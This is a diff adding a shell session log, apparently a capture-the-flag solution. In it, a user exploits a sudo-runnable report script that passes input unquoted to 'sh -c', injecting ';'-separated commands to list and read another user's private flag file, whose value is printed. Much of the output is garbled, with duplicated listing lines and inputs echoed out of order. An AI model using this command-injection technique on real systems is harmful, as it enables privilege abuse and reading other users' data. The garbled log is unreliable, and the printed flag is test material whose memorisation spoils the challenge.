@@ -1,0 +1,100 @@
+hr_sw337ie@unexpected:~$ ls
+message.txt
+hr_sw337ie@unexpected:~$ ls -la
+total 24
+drwxr-x--- 2 hr_sw337ie hr_sw337ie 4096 Nov 19 16:37 .
+drwxr-xr-x 1 root       root       4096 Nov 19 16:37 ..
+-rw-r--r-- 1 hr_sw337ie hr_sw337ie  220 Jan  6  2022 .bash_logout
+-rw-r--r-- 1 hr_sw337ie hr_sw337ie 3771 Jan  6  2022 .bashrc
+-rw-r--r-- 1 hr_sw337ie hr_sw337ie  807 Jan  6  2022 .profile
+-rw-r--r-- 1 root       root        194 Nov 10 09:45 message.txt
+hr_sw337ie@unexpected:~$ cd ..
+hr_sw337ie@unexpected:/home$ ls
+bo55man  hacker  hr_sw337ie
+hr_sw337ie@unexpected:/home$ cd bo55man/
+hr_sw337ie@unexpected:/home/bo55man$ ls 
+ls: cannot open directory '.': Permission denied
+hr_sw337ie@unexpected:/home/bo55man$ cat generate_report.sh
+#!/bin/bash
+
+echo "Enter a employee name to generate a report:"
+read employee_name
+
+filename="/home/bo55man/mails"
+sh -c "echo Mr $employee_name is a disgrace to our company, and should be fired nonetheless! >>$filename"
+
+hr_sw337ie@unexpected:/home/bo55man$ cd /mails
+bash: cd: /mails: No such file or directory
+hr_sw337ie@unexpected:/home/bo55man$ cat mails
+Mr ion is a disgrace to our company, and should be fired nonetheless!
+hr_sw337ie@unexpected:/home/bo55man$ sudo -u bo55man ./generate_report.sh
+Enter a employee name to generate a report:
+ls -la
+hr_sw337ie@unexpected:/home/bo55man$ cat mails
+Mr ion is a disgrace to our company, and should be fired nonetheless!
+Mr ls -la is a disgrace to our company, and should be fired nonetheless!
+hr_sw337ie@unexpected:/home/bo55man$ sudo -u bo55man ./generate_report.sh
+Enter a employee name to generate a report:
+; ls -la ; 
+Mr
+total 32
+drwxr-x---+ 3 bo55man bo55man 4096 Nov 19 16:41 .
+drwxr-xr-x  1 root    root    4096 Nov 19 16:37 ..
+-rw-r--r--  1 bo55man bo55man  220 Jan  6  2022 .bash_logout
+-rw-r--r--  1 bo55man bo55man 3771 Jan  6  2022 .bashrc
+drwxr-xr-x  2 bo55man bo55man 4096 Nov 19 16:37 .mystuff
+-rw-r--r--  1 bo55man bo55man  807 Jan  6  2022 .profile
+-rwxr-xr-x  1 root    root     222 Nov 19 16:37 generate_report.sh
+drwxr-xr-x  2 bo55man bo55man 4096 Nov 19 16:37 .mystuff
+-rw-r--r--  1 bo55man bo55man  807 Jan  6  2022 .profile
+-rwxr-xr-x  1 root    root     222 Nov 19 16:37 generate_report.sh
+-rw-rw-r--  1 bo55man bo55man  143 Nov 19 16:49 mails
+sh: 1: is: not found
+hr_sw337ie@unexpected:/home/bo55man$ sudo -u bo55man ./generate_report.sh
+Enter a employee name to generate a report:
+-rwxr-xr-x  1 root    root     222 Nov 19 16:37 generate_report.sh
+-rw-rw-r--  1 bo55man bo55man  143 Nov 19 16:49 mails
+sh: 1: is: not found
+hr_sw337ie@unexpected:/home/bo55man$ sudo -u bo55man ./generate_report.sh
+Enter a employee name to generate a report:
+-rw-rw-r--  1 bo55man bo55man  143 Nov 19 16:49 mails
+sh: 1: is: not found
+hr_sw337ie@unexpected:/home/bo55man$ sudo -u bo55man ./generate_report.sh
+Enter a employee name to generate a report:
+; ls -la .mystuff ;
+sh: 1: is: not found
+hr_sw337ie@unexpected:/home/bo55man$ sudo -u bo55man ./generate_report.sh
+Enter a employee name to generate a report:
+; ls -la .mystuff ;
+Mr
+hr_sw337ie@unexpected:/home/bo55man$ sudo -u bo55man ./generate_report.sh
+Enter a employee name to generate a report:
+; ls -la .mystuff ;
+Mr
+; ls -la .mystuff ;
+Mr
+total 12
+total 12
+drwxr-xr-x  2 bo55man bo55man 4096 Nov 19 16:37 .
+drwxr-x---+ 3 bo55man bo55man 4096 Nov 19 16:41 ..
+-rwx------  1 bo55man bo55man   45 Nov 19 16:37 my.flag
+drwxr-x---+ 3 bo55man bo55man 4096 Nov 19 16:41 ..
+drwxr-x---+ 3 bo55man bo55man 4096 Nov 19 16:41 ..
+-rwx------  1 bo55man bo55man   45 Nov 19 16:37 my.flag
+sh: 1: is: not found
+drwxr-x---+ 3 bo55man bo55man 4096 Nov 19 16:41 ..
+drwxr-x---+ 3 bo55man bo55man 4096 Nov 19 16:41 ..
+-rwx------  1 bo55man bo55man   45 Nov 19 16:37 my.flag
+sh: 1: is: not found
+hr_sw337ie@unexpected:/home/bo55man$ sudo -u bo55man ./generate_report.sh
+Enter a employee name to generate a report:
+; cat /.mystuff/my.flag ;
+Mr
+cat: /.mystuff/my.flag: No such file or directory
+sh: 1: is: not found
+hr_sw337ie@unexpected:/home/bo55man$ sudo -u bo55man ./generate_report.sh
+Enter a employee name to generate a report:
+; cat .mystuff/my.flag ;
+Mr
+SpeishFlag{E1e7dye8LBgpi7gnJodnZl7nSercPJfz}
+sh: 1: is: not found
